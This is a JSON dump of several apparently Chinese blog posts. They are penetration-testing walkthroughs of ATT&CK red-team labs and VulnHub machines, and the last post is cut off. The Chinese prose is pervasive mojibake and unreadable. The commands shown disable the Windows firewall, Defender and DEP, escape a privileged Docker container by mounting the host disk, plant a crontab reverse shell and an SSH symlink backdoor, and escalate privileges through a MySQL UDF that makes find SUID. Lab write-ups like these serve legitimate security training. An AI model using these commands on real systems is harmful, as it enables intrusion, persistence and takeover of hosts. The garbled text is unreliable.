[{"title":"ATT-CKçº¢é˜Ÿå®æˆ˜é¶åœº05","url":"/2022/08/19/ATT-CKçº¢é˜Ÿå®æˆ˜é¶åœº05/","content":"\n# åŸºæœ¬ä¿¡æ¯\n\nè™šæ‹Ÿæœºå¯†ç \nwin7\n\nsun\\heart 123.com\n\nsun\\Administrator dc123.com\n\n2008\n\nsun\\admin 2020.com\n\nWin7åŒç½‘å¡æ¨¡æ‹Ÿå†…å¤–ç½‘ï¼Œè¿™é‡Œæˆ‘ä¸ºäº†æ–¹ä¾¿å°†win7çš„å¤–ç½‘ç½‘å¡è®¾ç½®ä¸ºå¤åˆ¶ç‰©ç†æœºç½‘ç»œå¹¶dhcpï¼Œå’Œæ”»å‡»æœºkaliå¤„äºä¸€ä¸ªç½‘æ®µï¼Œè¿›å…¥win7å¯åŠ¨cç›˜ä¸‹çš„phpstudy\n\n\n\n# å¤–ç½‘æ‰“ç‚¹\n\n## tp5\n\nå¯¹å¤–ç½‘webé¶æœºè¿›è¡Œæ‰«æ\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208190948121.png)\n\nçœ‹çœ‹webæœåŠ¡ï¼Œtp5ä¸å¤šè¯´äº†ï¼Œæå‡ºtpå¤§æ€å™¨\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208190952037.png)\n\nç›´æ¥ç”¨å·¥å…·getshell\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208190957533.png)\n\n\n\nä¸Šèšå‰‘ï¼Œä¿¡æ¯æ”¶é›†,å‘ç°æœ‰ä¸¤å¼ ç½‘å¡\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208191003798.png)\n\n\n\nå­˜åœ¨åŸŸ\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208191006155.png)\n\nå®šä½åŸŸæ§\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208191007293.png)\n\n\n\n# å†…ç½‘æ¸—é€\n\nç”Ÿæˆä¸€ä¸ªæ— æ–‡ä»¶è½åœ°åé—¨ï¼Œä¸Šçº¿åˆ°csä¸Š\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208191013567.png)\n\n\n\nå‘ç°ä¸€ç›´æ²¡æœ‰ä¸Šçº¿ï¼Œåº”è¯¥æ˜¯å¼€äº†é˜²ç«å¢™ï¼Œå…ˆå…³é—­é˜²ç«å¢™å†çœ‹çœ‹\n\n```bash\nnetsh advfirewall set allprofiles state off #å…³é—­é˜²ç«å¢™\nnet stop windefend #å…³é—­windefebd\nbcdedit.exe /set{current} nx AlwaysOff #å…³é—­DEP\n```\n\n\n\næˆåŠŸä¸Šçº¿cs\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208191022162.png)\n\n\n\nåˆ›å»ºä¸€ä¸ªsmbç›‘å¬å™¨ï¼Œææƒåˆ°systemæƒé™\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208191026280.png)\n\n\n\næ‰«æå†…ç½‘å­˜æ´»ä¸»æœºï¼Œè¿›è¡Œæ¨ªå‘ç§»åŠ¨\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208191046716.png)\n\n\n\nå¯¹dcè¿›è¡Œæ¨ªå‘ï¼Œç­‰ä¸€ä¼šæ‹¿åˆ°dcæƒé™\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208191050225.png)\n\n\n\n","tags":["ATT&CK","å†…ç½‘æ¸—é€"],"categories":["æ‰“é¶"]},{"title":"ATT&CKçº¢é˜Ÿå®æˆ˜é¶åœº04","url":"/2022/08/16/ATT-CKçº¢é˜Ÿå®æˆ˜é¶åœº04/","content":"\n# åŸºæœ¬ä¿¡æ¯\n\nè´¦å·å¯†ç \n\n- web ubuntu:ubuntu \t\n- åŸŸæˆå‘˜ douser:Dotest123 \n- DC administrator:Test2008\n\nç¯å¢ƒä¸ºkaliå¤åˆ¶ç‰©ç†ç½‘ç»œï¼Œubuntuå¤åˆ¶ç‰©ç†ç½‘ç»œ/ä»…ä¸»æœºï¼Œå…¶ä½™éƒ½ä¸ºä»…ä¸»æœº\n\n# æ‹“è¡¥å›¾\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161117759.png)\n\n\n\n# å¤–ç½‘æ‰“ç‚¹\n\nå¯¹ubuntuè¿›è¡Œæ‰«æ\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161124388.png)\n\n\n\n## S2\n\næŒ¨ä¸ªè®¿é—®ï¼Œ2001ç«¯å£æ ¹æ®titleå¯ä»¥çœ‹åˆ°æ˜¯Struts2æ¡†æ¶\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161126930.png)\n\n\n\næå‡ºæ£€æµ‹å·¥å…·,å­˜åœ¨æ¼æ´\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161138940.png)\n\nexpç›´æ¥æ‹¿ä¸‹rootæƒé™\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161153328.png)\n\n\n\n## tomcat\n\n2002ç«¯å£tomcatï¼Œæƒ³warå†™é©¬ä½†æ˜¯403\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161128199.png)\n\n\n\næ£€æµ‹åˆ°å­˜åœ¨cve-2017-12615\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161201997.png)\n\n\n\n## phpmyadmin\n\n2003ç«¯å£phpmyadminæœªæˆæƒ,é¦–å…ˆæƒ³åˆ°çš„æ˜¯å†™é€šè¿‡æ—¥å¿—å†™é©¬ï¼Œä½†æ˜¯æ²¡æœ‰æƒé™\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161128518.png)\n\n\n\nç½‘ä¸Šæ‰¾åˆ°4.8.1ç‰ˆæœ¬å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå¯ä»¥é€šè¿‡å†™å…¥ç¼“å­˜æ–‡ä»¶æ¥getshell\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161224429.png)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161237172.png)\n\n\n\nå¤ç°è¿æ¥https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2018-12613/README.zh-cn.md\n\nç„¶ååœ¨teståº“ä¸­æŸ¥è¯¢ï¼Œå†™å…¥sessionç¼“å­˜ï¼Œç„¶åå†åŒ…å«è¿™ä¸ªsessionæ–‡ä»¶æ¥getshellï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘æœ¬åœ°æ ¹æœ¬æ²¡æœ‰ç”Ÿæˆè¿™ä¸ªsessionæ–‡ä»¶ï¼Œå·²ç»æ‹¿åˆ°ä¸¤ä¸ªrootæƒé™çš„shellï¼Œä¸å½±å“\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161314665.png)\n\n\n\n## dockeré€ƒé€¸\n\næ ¹æ®æ‹¿åˆ°çš„shellæ”¶é›†ä¿¡æ¯\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161321337.png)\n\n\n\nåˆ¤æ–­æ˜¯å¦ä¸ºdockerç¯å¢ƒ\n\nls -alh /.dockerenv #æŸ¥çœ‹æ˜¯å¦å­˜dockerrnvæ–‡ä»¶\ncat /proc/1/cgroup #æŸ¥çœ‹ç³»ç»Ÿè¿›ç¨‹çš„cgroupä¿¡æ¯\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161321490.png)\n\n\n\næ­¤å¤„åˆ©ç”¨ç‰¹æƒæ¨¡å¼é€ƒé€¸ï¼Œåˆ›å»ºå®¹å™¨æ—¶é€šè¿‡æ·»åŠ â€“privileged=trueå‚æ•°ï¼Œå°†å®¹å™¨ä»¥ç‰¹æƒæ¨¡å¼èµ·åŠ¨\n\n```bash\ndocker run -itd --name privilegeTest â€“-privileged=true mongo:3.6-streth\n```\n\n\n\n ç‰¹æƒæ¨¡å¼èµ·åŠ¨çš„å®¹å™¨ï¼Œå®æˆ˜å¯é€šè¿‡cat /proc/self/status |grep Capå‘½ä»¤åˆ¤æ–­å½“å‰å®¹å™¨æ˜¯å¦é€šè¿‡ç‰¹æƒæ¨¡å¼èµ·ï¼ˆ000000xfffffffffä»£è¡¨ä¸ºç‰¹æƒæ¨¡å¼èµ·ï¼‰è¿™é‡Œtomcatå®¹å™¨æ˜¯ç‰¹æƒæ¨¡å¼å¯åŠ¨çš„\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161431272.png)\n\n\n\nfdisk -l #æŸ¥çœ‹ç£ç›˜æ–‡ä»¶\nmkdir /chan #æ–°å»ºä¸€ä¸ªç›®å½•ç”¨äºæŒ‚è½½\nmount /dev/sda1 /chan #å°†å®¿ä¸»æœº/dev/sda1ç›®å½•æŒ‚è½½åˆ°å®¹å™¨å†…\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161433483.png)\n\nå†åˆ©ç”¨è®¡åˆ’ä»»åŠ¡åå¼¹shellï¼Œè¿™ç§åŠäº¤äº’å¼shellï¼Œèµ°webåè®®åœ¨å†™è®¡åˆ’ä»»åŠ¡çš„æ—¶å€™ä¼šæœ‰å¾ˆå¤šè½¬ä¹‰é—®é¢˜ï¼Œç›´æ¥å†™webshellåˆ°æ ¹ç›®å½•ä¹Ÿå‡ºå„ç§é—®é¢˜ï¼Œäºæ˜¯ç”¨kalièµ·äº†ä¸€ä¸ªwebæœåŠ¡æŠŠwebshellæ”¾è¿›å»ï¼Œè®©è¿™ä¸ªtomcatå®¹å™¨å»ä¸‹è½½\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161511233.png)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161511479.png)\n\n\n\n## è®¡åˆ’ä»»åŠ¡åå¼¹shell\n\nå†™å…¥åå¼¹è¯­å¥\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161517957.png)\n\nå†™åˆ°è®¡åˆ’ä»»åŠ¡é‡Œ\n\n```bash\nsed -i '$a*/1 *    * * *    root  bash /tmp/shell.sh ' /chan/etc/crontab \ncat /chan/etc/crontab\n```\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161521524.png)\n\n\n\nkaliæˆåŠŸæ”¶åˆ°ä¼šè¯\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161521969.png)\n\n\n\næ„é€ sshè½¯è¿æ¥åé—¨ï¼Œåšæƒé™ç»´æŒ\n\nè½¯è¿åé—¨éœ€è¦rootæ‰§è¡Œåé—¨å‘½ä»¤ï¼Œä»»æ„å¯†ç ç™»å½•\n\n```bash\nln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oport=12345\n```\n\n\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161604297.png)\n\n# å†…ç½‘æ¸—é€\n\n## ä¿¡æ¯æ”¶é›†\n\nå‘ç°æœ‰ä¸¤å¼ ç½‘å¡\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161522665.png)\n\n\n\nå¼¹ä¸€ä¸ªä¼šè¯åˆ°msfä¸Šï¼Œæ–¹ä¾¿å†…ç½‘æ¸—é€,ç›´æ¥ç”¨msfè‡ªå¸¦çš„webshellæ¯”å»ç”Ÿæˆåé—¨å†ä¸Šä¼ æ–¹ä¾¿å¾ˆå¤šï¼Œ\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161540400.png)\n\nå°†ç”Ÿæˆçš„è¿æ¥å¤åˆ¶åˆ°åˆšåˆšè¿”å¼¹çš„shellä¸­æ‰§è¡Œ\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161540889.png)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161542230.png)\n\n\n\næ‹¿åˆ°ä¼šè¯\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161543354.png)\n\næ·»åŠ åˆ°40ç½‘æ®µçš„è·¯ç”±\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161547033.png)\n\n\n\nä½¿ç”¨kaliè‡ªå¸¦çš„æ¨¡å—å†å¯¹40ç½‘æ®µå­˜æ´»ä¸»æœºè¿›è¡Œæ‰«æ\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161617099.png)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161618476.png)\n\nå†è¿›è¡Œç«¯å£æ¢æµ‹\n\n```bash\nuse auxiliary/scanner/portscan/tcp\n```\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161622111.png)\n\n\n\n## å†…ç½‘æ‰“ç‚¹\n\nå¼€æ”¾äº†445ç«¯å£å°è¯•17010ï¼Œè¿™é‡Œè¦åˆ›å»ºä¸€ä¸ªæ­£å‘è¿æ¥çš„payloadï¼Œå› ä¸ºæˆ‘ä»¬æ— æ³•ç›´æ¥ä¸é¶æœºé€šä¿¡ï¼Œåå‘è¿æ¥çš„è¯é¶æœºæ— æ³•è¿æ¥åˆ°kali\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208161628372.png)\n\n\n\nms17-010æ‰“è¿‡å»ä¸è¿”å›ä¼šè¯ï¼Œä¸çŸ¥é“ç®¡ç†å‘˜å¯†ç ï¼Œä½œå¼Šç›´æ¥ä¸Šå»åå¼¹shellï¼Œæ˜¯åŸŸç”¨æˆ·ä¸æ˜¯systemè¿è¡Œä¸äº†mimikatz\n\nç›´æ¥å¯„äº†ï¼Œåé¢çš„æµç¨‹å°±æ˜¯æ‰“åˆ°åŸŸç”¨æˆ·ï¼Œç„¶åæŠ“å–hashåˆ¶ä½œTGTç¥¨æ®ï¼Œç„¶åç”¨ms14-068æ‰“åˆ°åŸŸæ§ï¼Œåˆ¶ä½œé»„é‡‘ç¥¨æ®ç»´æŒæƒé™\n\n\n\n","tags":["ATT&CK","å†…ç½‘æ¸—é€"],"categories":["æ‰“é¶"]},{"title":"vulnhub-Raven2æ‰“é¶","url":"/2022/08/13/vulnhub-Raven2æ‰“é¶/","content":"\n# ä¿¡æ¯æ”¶é›†\n\nå¯¹é¶æœºè¿›è¡Œç«¯å£æ‰«æ\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208131816114.png)\n\n\n\næ‰«ä¸€ä¸‹ç›®å½•ï¼Œæ‰«åˆ°ä¸€ä¸ªç›®å½•éå†\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208131827969.png)\n\n\n\næ‹¿åˆ°ç¬¬ä¸€ä¸ªflag\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208131829833.png)\n\næ‰¾åˆ°ç‰ˆæœ¬ä¿¡æ¯ phpmailer5.2.16\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208131830372.png)\n\n\n\n# Exploit\n\n## webæ‰“ç‚¹\n\næ ¹æ®ç‰ˆæœ¬ä¿¡æ¯æ‰¾ä¸€ä¸‹åˆ©ç”¨æ–‡ä»¶\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208131832070.png)\n\n\n\n-m id ä¸‹è½½åˆ°æœ¬åœ°\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208131843406.png)\n\n\n\nä¿®æ”¹è„šæœ¬\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208131854768.png)\n\n\n\nå†èµ·ä¸€ä¸ªç»ˆç«¯ç›‘å¬\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208131850579.png)\n\n\n\nä½¿ç”¨pythonè¿è¡Œè„šæœ¬ï¼Œè®¿é—®åé—¨\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208131904663.png)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208131904435.png)\n\n\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208131905706.png)\n\n\n\nç”¨pyè¿”å›ä¸€ä¸ªåŠäº¤äº’å¼shellï¼Œæ‰¾åˆ°ç¬¬äºŒä¸ªflag\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208141044792.png)\n\n## ææƒ\n\nlinuxææƒä¸‰æ¿æ–§ï¼Œsuidï¼Œsudoæ— å¯†ç ï¼Œå†…æ ¸çš†æ— æœ\n\nå°è¯•å…¶ä»–æ–¹å¼ï¼Œçœ‹çœ‹ç½‘ç«™é…ç½®æ–‡ä»¶wp-config.phpï¼Œæ‰¾åˆ°mysqlå¯†ç \n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208141048058.png)\n\n\n\næœ‰mysqlçš„rootè´¦å·æˆ‘ä»¬å¯ä»¥ä½¿ç”¨udfææƒï¼Œä½†æ˜¯éœ€è¦secure_file_privçš„å€¼ä¸ä¸ºnullæˆ–è€…ä¸åšé™åˆ¶\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208141052878.png)\n\næ²¡æœ‰å¯¼å…¥å¯¼å‡ºé™åˆ¶ï¼ŒæŸ¥çœ‹mysqlç‰ˆæœ¬å’Œä¸»æœºç‰ˆæœ¬ã€æ¶æ„\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208141055131.png)\n\nä¸‹è½½åˆ©ç”¨æ–‡ä»¶æ¥ææƒ\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208141107997.png)\n\nç¼–è¯‘ä¸‹è½½å¥½çš„åˆ©ç”¨æ–‡ä»¶\n\n```bash\ngcc -g -c 1518.c\ngcc -g -shared -Wl,-soname,raptor_udf2.so -o 1.so 1518.o -lc\n```\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208141108499.png)\n\n\n\nå†åœ¨kaliç”¨pythonèµ·ä¸€ä¸ªwebæœåŠ¡ï¼Œé¶æœºä¸‹è½½åˆ©ç”¨åˆ°æœ¬åœ°ææƒ\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208141112443.png)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208141113459.png)\n\nè¿›å…¥mysqlï¼Œæ„é€ è‡ªå®šä¹‰å‡½æ•°ï¼Œç»™findä¸€ä¸ªsæƒé™ä¹Ÿå°±æ˜¯suid\n\n```mysql\nuse mysql;\ncreate table foo(line blob);\ninsert into foo values(load_file('/tmp/111.so'));   //ä¸Šä¼ åˆ°å“ªå°±å†™å“ª\nselect * from foo into dumpfile '/usr/lib/mysql/plugin/111.so';   //è¿™ä¸ªå’Œä¸Šä¸€è¡Œä¸æ˜¯ä¸€ä¸ªè·¯å¾„å—·ï¼Œè¦æ ¹æ®å‰é¢è¿›ç¨‹åˆ—å‡ºæ¥çš„pluginç›®å½•è¿›è¡Œæ”¹åŠ¨ï¼ˆä¸€èˆ¬å°±æ˜¯è¿™ä¸ªï¼‰\ncreate function do_system returns integer soname '111.so';     //åˆ›å»º do_system å‡½æ•°è°ƒç”¨\nselect do_system('chmod u+s /usr/bin/find');     //ç»™findå‘½ä»¤èµ‹äºˆsuidæƒé™\n```\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208141120336.png)\n\né€€å‡ºmysqlï¼Œåˆ©ç”¨findè¿”å›ä¸€ä¸ªshell\n\n```bash\nfind . -exec /bin/sh \\;\n```\n\n\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202208141123993.png)\n","tags":["vulnhub","udfææƒ"],"categories":["æ‰“é¶"]},{"title":"vuln-Momentum2æ‰“é¶","url":"/2022/07/27/vulnhub-Momentum2æ‰“é¶/","content":"\n# ç¯å¢ƒ\n\n| æ”»å‡»æœº        | é¶æœº          |\n| ------------- | ------------- |\n| 172.16.17.140 | 172.16.17.158 |\n\n\n\n# ä¿¡æ¯æ”¶é›†\n\nå¯¹é¶æœºè¿›è¡Œæ‰«æ\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207272220840.png)\n\n\n\nå¼€æ”¾22,80ç«¯å£ï¼Œè®¿é—®webæœåŠ¡æ²¡æœ‰åŠŸèƒ½ç‚¹ï¼Œç»§ç»­æ‰«ç›®å½•\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207272225529.png)\n\nè®¿é—®/jså­˜åœ¨å­˜åœ¨ä¸€ä¸ªjsæ–‡ä»¶\n\n<img src=\"https://raw.githubusercontent.com/chencicici/images/main/202207272228711.png\" style=\"zoom:50%;\" />\n\n\n\ndashboard.htmlæ˜¯ä¸€ä¸ªä¸Šä¼ é¡µé¢\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207272230972.png)\n\n\n\najax.phpæ— ä»»ä½•å›æ˜¾\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207272232356.png)\n\n\n\nç»“åˆä¸Šé¢çš„ä¿¡æ¯çŸ¥é“æ˜¯ä¸€ä¸ªä¸Šä¼ è„šæœ¬ï¼Œåç«¯ç”±ajax.phpå»å¤„ç†\n\n\n\n# Exploit\n\n## ä¸Šä¼ ç»•è¿‡\n\nå°è¯•ä¸Šä¼ shellï¼Œè¢«è¿‡æ»¤\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207272244313.png)\n\n\n\nç»§ç»­fuzz,å‘ç°åç¼€ä¸ºtxtçš„ä¸Šä¼ æˆåŠŸ\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207272245618.png)\n\nä½†æ˜¯æ²¡æœ‰è¿”å›ä¸Šä¼ è·¯å¾„ï¼Œæ¢ä¸ªå­—å…¸ç»§ç»­ï¼Œæ‰«å‡ºäº†ä¸Šä¼ è·¯å¾„å’Œä¸€ä¸ªå¤‡ä»½æ–‡ä»¶ajax.php.bak\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207272305974.png)\n\n\n\næŸ¥çœ‹å¤‡ä»½æ–‡ä»¶ï¼Œå½“cookieä¸ºå­—æ®µadmin=&G6u@B6uDXMq&Msæ—¶å¯ä»¥ä¸Šä¼ php,è¿˜æç¤ºéœ€è¦åœ¨cookieæœ«å°¾æ·»åŠ ä¸€ä¸ªå¤§å†™å­—æ¯ï¼ŒåŒæ—¶postå­—æ®µsecureçš„å€¼ä¸ºval1d\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207272307017.png)\n\n\n\nburpå‘åŒ…å¼€å§‹çˆ†ç ´\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207272359360.png)\n\n\n\nå½“æœ€åä¸€ä½å¤§å†™å­—æ¯ä¸ºRçš„æ—¶å€™ï¼Œä¸Šä¼ æˆåŠŸ,æ‹¿åˆ°ç¬¬ä¸€ä¸ªflag\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207280005485.png)\n\n\n\n## ææƒ\n\nç»§ç»­å¾€ä¸‹ï¼Œç¿»åˆ°ä¸€ä¸ªå¯†ç \n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207280006415.png)\n\n\n\nsshä¸Šå»æ‹¿åˆ°ä¸€ä¸ªå®Œæ•´çš„shellï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå°å‘ï¼Œ[]é‡Œçš„å•è¯æ˜¯*çš„æ„æ€ï¼Œåœ¨å¯†ç appåé¢åŠ ä¸ª * å³å¯\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207280010238.png)\n\n\n\nlinuxææƒä¸‰æ¿æ–§ï¼Œsuidï¼Œsudoæ— å¯†ç ï¼Œå†…æ ¸\n\næ‰¾åˆ°ä¸€ä¸ªrootæƒé™æ— å¯†ç çš„pyæ–‡ä»¶\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207280015799.png)\n\n\n\næ¥å—è¾“å…¥ï¼Œæ‰§è¡Œå‘½ä»¤å»äº§ç”Ÿcookieå¹¶è¾“å‡ºï¼Œæ²¡æœ‰è¿‡æ»¤å­˜åœ¨rce\n\nkalièµ·ä¸€ä¸ªç›‘å¬ï¼Œç„¶åæ‰§è¡Œ\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207280020452.png)\n\n\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207280020643.png)\n","tags":["vulnhub"],"categories":["æ‰“é¶"]},{"title":"vulnhub-MOMENTUM:1æ‰“é¶","url":"/2022/07/26/vulnhub-MOMENTUM-1æ‰“é¶/","content":"\n# ç¯å¢ƒ\n\n| æ”»å‡»æœº        | é¶æœº          |\n| ------------- | ------------- |\n| 172.16.17.140 | 172.16.17.157 |\n\n\n\n# ä¿¡æ¯æ”¶é›†\n\nå¯¹é¶æœºè¿›è¡Œç«¯å£æ‰«æ\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207262304123.png)\n\nåªå¼€äº†ä¸¤ä¸ªç«¯å£22,80ï¼Œå…ˆæ‰«ä¸€ä¸‹ç›®å½•ï¼Œæ‰«åˆ°ä¸€ä¸ªjsç›®å½•ï¼Œæ‰“å¼€å‘ç°ä¸€ä¸ªjsæ–‡ä»¶\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207262323200.png)\n\n\n\nå‘ç°AESç§˜é’¥å’Œä¸€ä¸ªè¿æ¥\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207262326894.png)\n\n\n\n# Exploit\n\n## xss\n\n\n\nè®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼Œå‘ç°è¾“å…¥ä»€ä¹ˆéƒ½ä¼šåœ¨é¡µé¢å›æ˜¾å‡ºæ¥\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207262344102.png)\n\n\n\né‚£ä¹ˆåº”è¯¥å­˜åœ¨xssæ¼æ´ï¼Œç»“åˆä¸Šé¢ç»™å‡ºçš„aesç§˜é’¥ï¼Œå¼¹ä¸ªcookieçœ‹çœ‹\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207262351634.png)\n\nAESè§£å¯†å‡ºå¯†æ–‡æ˜¯ä¸€ä¸ªè´¦å·å¯†ç \n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207262353466.png)\n\n\n\nauxerre/auxerre-alienum## å°è¯•ç™»å½•ssh\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207262355496.png)\n\n\n\næ‹¿åˆ°ç¬¬ä¸€ä¸ªflag\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207270015731.png)\n\n\n\n## ææƒ\n\n## redisæœªæˆæƒè®¿é—®\n\nå°è¯•äº†suidï¼Œsudoæ— å¯†ç çš†æ— æœï¼Œåœ¨æŸ¥çœ‹è¿›ç¨‹çš„æ—¶å€™å‘ç°äº†redisæœåŠ¡\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207270019758.png)\n\n\n\nå°è¯•æ— å¯†ç ç™»å½•æˆåŠŸ\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207270022112.png)\n\n","tags":["vulnhub","redis"],"categories":["æ‰“é¶"]},{"title":"ATT&CKçº¢é˜Ÿå®æˆ˜é¶åœº03","url":"/2022/07/23/ATT-CKçº¢é˜Ÿå®æˆ˜é¶åœº03/","content":"\n\n\n# åŸºæœ¬ä¿¡æ¯\n\næœ¬æ¬¡æµ‹è¯•ä¸ºé»‘ç›’æµ‹è¯•ï¼Œæ‰€ä»¥æ‰€æœ‰ä¸»æœºéƒ½ä¸ºæŒ‚èµ·çŠ¶æ€ï¼Œä¸”è´¦å·éƒ½é»˜è®¤å·²ç»ç™»å½•\n\nå·²çŸ¥å‡ºç½‘ä¸»æœºä¸ºcentosä¸»æœº\n\nå°†centoså‡ºç½‘ç½‘å¡å’Œkaliæ”»å‡»æœºç½‘å¡éƒ½è®¾ç½®ä¸ºæ¡¥æ¥å¤åˆ¶ç‰©ç†ç½‘ç»œæ¨¡å¼\n\nå…¶å®ƒç½‘å¡éƒ½é»˜è®¤vmnet2æ¨¡å¼ï¼Œæ·»åŠ vmnet2ç½‘å¡\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207231503267.png)\n\n\n\nå¼€å¯centosåéœ€è¦é‡æ–°è·å–ä¸€æ¬¡ip eth0ç½‘å¡ä¸ºæˆ‘ä»¬å¤åˆ¶çš„ç‰©ç†ç½‘ç»œ\n\n```bash\ndhclient -r\ndhclient\n```\n\n# æ‹“æ‰‘å›¾\n\nipæœ‰å‡ºå…¥\n\n![img](https://xzfile.aliyuncs.com/media/upload/picture/20191223205755-d65c291e-2583-1.png)\n\n\n\n# å¤–ç½‘æ‰“ç‚¹\n\n## ä¿¡æ¯æ”¶é›†\n\nnmapç¡®å®šç›®æ ‡ip\n\n<img src=\"https://raw.githubusercontent.com/chencicici/images/main/202207231506534.png\" style=\"zoom:50%;\" />\n\n\n\nè¿›ä¸€æ­¥æ‰«æç«¯å£\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207231508278.png)\n\n\n\nç›®æ ‡ä¸ºubuntu16.04.1\n\n22ç«¯å£å­˜åœ¨sshï¼Œå¯ä»¥çˆ†ç ´\n\n80ç«¯å£webæœåŠ¡\n\n3306ç«¯å£mysqlæ•°æ®åº“ï¼Œå¯ä»¥çˆ†ç ´\n\n\n\n## webæ‰“ç‚¹\n\nè®¿é—®ç½‘ç«™ï¼Œç”¨æ’ä»¶å¾—åˆ°cmsä¿¡æ¯ nginx+php+joomla\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207231540227.png)\n\n\n\n\n\nä½¿ç”¨joomscanå·¥å…·æ‰«æï¼Œæ²¡æœ‰æ¼æ´ä½†æ˜¯çŸ¥é“äº†ç‰ˆæœ¬ä¸º3.9.12\n\n```bash\njoomscan -u http://192.168.31.54\n```\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207231553270.png)\n\n\n\næ‰«å‡ºäº†åå°å’Œä¸€ä¸ªé…ç½®æ–‡ä»¶\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202207231602861.png)\n\n<img src=\"https://raw.githubusercontent.com/chencicici/images/main/202207231604877.png\" style=\"zoom:50%;\" />\n\nå¾—åˆ°mysqlå¯†ç å’Œç»å¯¹è·¯å¾„\n\n<img src=\"https://raw.githubusercontent.com/chencicici/images/main/202207231605901.png\" style=\"zoom:50%;\" 